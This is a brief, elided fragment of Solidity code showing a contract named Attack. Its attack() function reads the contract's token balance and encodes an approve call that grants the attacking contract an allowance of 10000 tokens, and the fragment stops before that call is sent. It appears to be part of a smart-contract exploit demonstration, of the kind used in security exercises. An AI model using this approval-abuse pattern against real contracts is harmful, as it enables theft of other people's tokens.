...
contract Attack {
    ...
    function attack() public returns (uint256 before_balance, uint256 after_balance) {
        before_balance = token.balanceOf(address(this));
        bytes memory _calldata = abi.encodeWithSignature("approve(address,uint256)", address(this), 10000);
